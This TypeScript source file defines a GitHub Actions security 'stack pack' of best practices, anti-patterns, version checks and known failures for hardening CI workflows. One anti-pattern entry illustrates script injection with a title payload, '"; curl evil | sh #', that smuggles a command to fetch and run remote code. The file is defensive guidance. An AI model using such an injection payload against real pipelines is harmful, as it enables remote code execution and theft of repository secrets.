/**
 * GitHub Actions (CI/CD) reference stack pack.
 *
 * Real, current (2026) guidance for hardening GitHub Actions workflows against
 * the supply-chain and injection risks that make CI a high-value target: pinning
 * third-party actions to a full commit SHA, restricting the GITHUB_TOKEN with a
 * least-privilege `permissions:` block, authenticating to cloud with OIDC instead
 * of long-lived secrets, avoiding the pull_request_target + checkout-PR-head +
 * secrets footgun, preventing `${{ ... }}` script injection from untrusted event
 * fields, gating deploys behind protected Environments, and using concurrency
 * groups + dependency caching. Language-agnostic: keyed off a `github-actions`
 * (or generic `ci`) deployment hint.
 */

import type { KnownFailure, Rule, StackPack, VersionCheck } from '../domain/index';

// CI/CD is language-agnostic — match on a github-actions / generic ci hint.
const GHA_HINTS = ['github-actions', 'github', 'gha', 'ci', 'ci-cd'];

const bestPractices: Rule[] = [
  {
    id: 'gha.pin-actions-to-sha',
    title: 'Pin third-party actions to a full commit SHA',
    detail:
      'Reference actions as owner/action@<40-char-sha> (with a comment for the human-readable version) rather than a mutable @v4/@main tag. A tag can be re-pointed at malicious code; a SHA cannot. Update pins deliberately via Dependabot for actions.',
    severity: 'high',
    appliesTo: ['config'],
  },
  {
    id: 'gha.least-privilege-token',
    title: 'Set a least-privilege permissions block for GITHUB_TOKEN',
    detail:
      'Declare permissions: {} (or contents: read) at the workflow level and grant only the specific scopes a job needs (e.g. id-token: write for OIDC, contents: write only for a release job). The default token is broad; narrowing it limits what a compromised step can do.',
    severity: 'high',
    appliesTo: ['config', 'auth'],
  },
  {
    id: 'gha.oidc-not-static-secrets',
    title: 'Authenticate to cloud providers with OIDC, not long-lived keys',
    detail:
      'Use the OIDC flow (id-token: write + the provider\'s configure-credentials action) to mint short-lived credentials scoped to the repo/branch via a trust policy. This removes long-lived cloud access keys from repository secrets entirely.',
    severity: 'high',
    appliesTo: ['config', 'auth', 'env'],
  },
  {
    id: 'gha.avoid-script-injection',
    title: 'Never interpolate untrusted ${{ github.event.* }} into a run script',
    detail:
      'Fields like the PR title, branch name, or issue body are attacker-controlled. Embedding ${{ github.event.pull_request.title }} directly in a run: shell line allows command injection. Pass them through an env: variable and reference "$TITLE" (quoted) so the shell treats them as data.',
    severity: 'critical',
    appliesTo: ['config'],
  },
  {
    id: 'gha.safe-pull-request-target',
    title: 'Do not combine pull_request_target with checking out and running PR code',
    detail:
      'pull_request_target runs in the base repo context with secrets and a write token. Checking out the untrusted PR head and then building/running it there hands secrets and repo write to a fork. Use pull_request for untrusted code, or check out only trusted base refs and never execute PR scripts in the privileged context.',
    severity: 'critical',
    appliesTo: ['config'],
  },
  {
    id: 'gha.protected-deploy-environments',
    title: 'Gate deploys behind protected Environments',
    detail:
      'Put deployment secrets in a GitHub Environment with required reviewers, wait timers, and branch restrictions, and target it with environment: production in the deploy job. Approvals and scoping then guard every production release.',
    severity: 'high',
    appliesTo: ['config', 'auth'],
  },
  {
    id: 'gha.concurrency-groups',
    title: 'Use concurrency groups to cancel superseded runs and serialise deploys',
    detail:
      'Add concurrency: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: true } on PR CI to cancel stale runs, and a non-cancelling group on deploys so two releases never race to the same environment.',
    severity: 'medium',
    appliesTo: ['config'],
  },
  {
    id: 'gha.cache-dependencies',
    title: 'Cache dependencies with a correct, lockfile-derived key',
    detail:
      'Use setup-node/setup-python built-in caching or actions/cache with a key hashing the lockfile (hashFiles(\'**/pnpm-lock.yaml\')) plus a restore-keys fallback. A key that does not change with the lockfile serves stale deps; one that never matches wastes the cache.',
    severity: 'low',
    appliesTo: ['config'],
  },
  {
    id: 'gha.pin-runner-and-matrix',
    title: 'Pin the runner image and use a matrix for coverage',
    detail:
      'Pin runs-on to a specific image (ubuntu-24.04, not ubuntu-latest) so a runner rollout does not silently change the toolchain, and use a strategy matrix to test across Node/Python/OS versions in parallel.',
    severity: 'medium',
    appliesTo: ['config', 'test'],
  },
];

const antiPatterns: Rule[] = [
  {
    id: 'gha.anti.mutable-action-tag',
    title: 'Referencing actions by a mutable tag or branch',
    detail:
      'owner/action@v4 or @main lets the action author (or an account takeover) change what runs in your pipeline with access to your secrets and token. Pin to a full commit SHA.',
    severity: 'high',
    appliesTo: ['config'],
  },
  {
    id: 'gha.anti.script-injection',
    title: 'Untrusted event data interpolated into a run: shell command',
    detail:
      'run: echo "${{ github.event.issue.title }}" executes attacker-controlled content in the shell — a title of `"; curl evil | sh #` runs arbitrary commands with your token. Route through env: and quote the variable.',
    severity: 'critical',
    appliesTo: ['config'],
  },
  {
    id: 'gha.anti.pr-target-runs-fork-code',
    title: 'pull_request_target that checks out and runs the PR head',
    detail:
      'This is the canonical GitHub Actions RCE: the privileged pull_request_target context (secrets + write token) building/running untrusted fork code exfiltrates secrets. Never execute PR code in that context.',
    severity: 'critical',
    appliesTo: ['config'],
  },
  {
    id: 'gha.anti.write-all-token',
    title: 'Leaving GITHUB_TOKEN at broad/default write permissions',
    detail:
      'A workflow with no permissions block (or permissions: write-all) gives every step a token that can push code, publish packages, and edit issues. Scope it down to read by default and elevate per job.',
    severity: 'high',
    appliesTo: ['config', 'auth'],
  },
  {
    id: 'gha.anti.long-lived-cloud-keys',
    title: 'Storing long-lived cloud access keys as repository secrets',
    detail:
      'Static AWS_SECRET_ACCESS_KEY / GCP service-account JSON in secrets is a durable target that survives any single leak. Replace them with OIDC-minted short-lived credentials.',
    severity: 'high',
    appliesTo: ['config', 'env', 'auth'],
  },
  {
    id: 'gha.anti.echo-secrets',
    title: 'Printing secrets or disabling masking',
    detail:
      'echo-ing a secret, writing it to an artifact, or structuring it so masking fails exposes it in logs that many people can read. Never output secrets; pass them only into the tools that need them.',
    severity: 'high',
    appliesTo: ['config', 'env'],
  },
  {
    id: 'gha.anti.no-concurrency',
    title: 'No concurrency control, so deploys race and CI wastes runners',
    detail:
      'Without a concurrency group, pushing twice quickly starts two deploys to the same environment (racing to a bad state) and leaves stale PR runs consuming minutes. Add concurrency groups.',
    severity: 'medium',
    appliesTo: ['config'],
  },
];

const versionChecks: VersionCheck[] = [
  {
    pkg: 'actions/checkout',
    supported: '^4',
    note: 'actions/checkout v4 (Node 20 runtime). Pin to the release commit SHA; persist-credentials:false when you do not need the token for later git operations.',
  },
  {
    pkg: 'actions/setup-node',
    supported: '^4',
    note: 'setup-node v4 with built-in dependency caching (cache: pnpm/npm). Pin by SHA and pass a node-version / node-version-file.',
  },
  {
    pkg: 'actions/cache',
    supported: '^4',
    note: 'actions/cache v4 — key off the lockfile hash with restore-keys fallbacks; v1/v2/v3 are deprecated on the runner.',
  },
  {
    pkg: 'ubuntu-runner',
    supported: 'ubuntu-24.04',
    note: 'Pin runs-on to ubuntu-24.04 rather than ubuntu-latest so a runner image rollover does not silently change the toolchain.',
  },
];

const commonFailures: KnownFailure[] = [
  {
    id: 'gha.fail.token-permission-denied',
    signature: 'Error: "Resource not accessible by integration" / 403 when the workflow pushes, comments, or publishes',
    cause: 'The GITHUB_TOKEN lacked the required scope — either the repo defaults it to read-only or the workflow set a narrow permissions block without the needed scope for that job.',
    fix: 'Add the specific scope to the job (e.g. permissions: { contents: write } or packages: write, id-token: write for OIDC) rather than widening the whole workflow.',
  },
  {
    id: 'gha.fail.script-injection-rce',
    signature: 'A security review / audit flags command injection via ${{ github.event.* }} in a run step',
    cause: 'Untrusted event data (PR title, branch, issue body) was interpolated directly into a shell command, allowing arbitrary command execution.',
    fix: 'Move the value into an env: variable and reference the quoted "$VAR" in run:; never inline ${{ github.event.* }} into a shell line.',
  },
  {
    id: 'gha.fail.secret-empty-on-fork',
    signature: 'Secrets are empty/undefined in a workflow triggered by a pull_request from a fork',
    cause: 'By design, pull_request from a fork runs without repository secrets to protect them from untrusted code.',
    fix: 'Run untrusted validation without secrets, and handle secret-requiring steps in a separate trusted workflow (workflow_run, or a labelled/approved gate) — do not reach for pull_request_target + checkout of the PR head.',
  },
  {
    id: 'gha.fail.oidc-trust-misconfig',
    signature: 'Cloud auth fails: "Not authorized to perform sts:AssumeRoleWithWebIdentity" / OIDC sub claim mismatch',
    cause: 'The cloud IAM trust policy did not match the token\'s sub/aud claims (wrong repo, ref, or audience), or id-token: write was not granted.',
    fix: 'Add permissions: { id-token: write }, and align the trust policy condition with the actual sub (repo:owner/name:ref:...) and audience the workflow presents.',
  },
  {
    id: 'gha.fail.cache-miss-or-stale',
    signature: 'Dependencies reinstall every run (cache miss) or a stale cache serves outdated packages',
    cause: 'The cache key did not include the lockfile hash (never matches, or never invalidates when deps change).',
    fix: 'Set key to include hashFiles of the lockfile with restore-keys fallbacks, or use setup-*\'s built-in cache which derives the key correctly.',
  },
  {
    id: 'gha.fail.compromised-action',
    signature: 'Unexpected network calls / secret exfiltration traced to a third-party action referenced by tag',
    cause: 'A mutable @v/@main tag was re-pointed at malicious code (or the action account was compromised), and the pipeline ran it with access to secrets.',
    fix: 'Pin every third-party action to a reviewed commit SHA, minimise the token permissions and secrets exposed to those steps, and update pins via Dependabot after review.',
  },
];

/**
 * The GitHub Actions CI/CD reference pack. Matches when the detected stack
 * advertises a github-actions/ci deployment target (language-agnostic).
 */
export const githubActionsPack: StackPack = {
  id: 'github-actions-ci',
  name: 'GitHub Actions — CI/CD pipelines',
  matches: (stack) => stack.deploymentTargets.some((target) => GHA_HINTS.includes(target)),
  bestPractices,
  antiPatterns,
  recommendedLibraries: [
    'actions/checkout@^4',
    'actions/setup-node@^4',
    'actions/cache@^4',
    'actions/upload-artifact@^4',
    'github/codeql-action@^3',
    'step-security/harden-runner@^2',
  ],
  versionChecks,
  setupCommands: [
    'mkdir -p .github/workflows',
    'gh workflow list',
    'gh secret set EXAMPLE_SECRET',
    'gh api repos/:owner/:repo/actions/permissions/workflow',
  ],
  testCommands: [
    'pnpm dlx @action-validator/cli .github/workflows/*.yml',
    'actionlint',
    'gh workflow run ci.yml --ref "$(git branch --show-current)"',
  ],
  qualityGates: [
    'Every third-party action is pinned to a full commit SHA, not a mutable tag/branch.',
    'A least-privilege permissions block is set (workflow default read; job-scoped elevation only where needed).',
    'Cloud authentication uses OIDC-minted short-lived credentials; no long-lived cloud keys live in repository secrets.',
    'No untrusted ${{ github.event.* }} value is interpolated into a run: shell command (routed via env: and quoted).',
    'No pull_request_target workflow checks out and runs untrusted PR code with secrets.',
    'Production deploys target a protected Environment with required reviewers.',
    'Concurrency groups cancel superseded CI runs and serialise deploys; runner images and dependency cache keys are pinned/lockfile-derived.',
    'Workflows lint clean (actionlint) in CI.',
  ],
  securityNotes: [
    'Pin third-party actions to a full commit SHA — a mutable @v4/@main tag can be re-pointed at malicious code that runs with your token and secrets.',
    'Scope GITHUB_TOKEN with a least-privilege permissions block (default read, elevate per job); never leave it write-all.',
    'Prefer OIDC for cloud auth so short-lived, repo/branch-scoped credentials replace long-lived access keys in secrets.',
    'Treat all ${{ github.event.* }} fields as untrusted: pass them through env: and quote them; direct interpolation into run: is command injection.',
    'Never combine pull_request_target with checkout of the PR head and secrets — that is the canonical Actions RCE; run untrusted code under pull_request without secrets.',
    'Put deployment secrets in a protected Environment with required reviewers, and never echo secrets or write them to artifacts/logs.',
  ],
  deploymentNotes: [
    'Trigger CI on pull_request (untrusted-safe) and deploys on push to protected branches or tags targeting a protected Environment.',
    'Use concurrency groups: cancel-in-progress on PR CI, and a non-cancelling group on the deploy job so two releases never race the same environment.',
    'Consider step-security/harden-runner to audit/block unexpected egress from runners, and enable Dependabot for actions to keep SHA pins current after review.',
    'Cache dependencies with a lockfile-hash key and use a build matrix for multi-version coverage; pin runs-on to a specific image (ubuntu-24.04).',
    'Promote artifacts (not source) between stages, and require the CI checks + environment approvals as branch-protection gates before merge/deploy.',
  ],
  commonFailures,
};
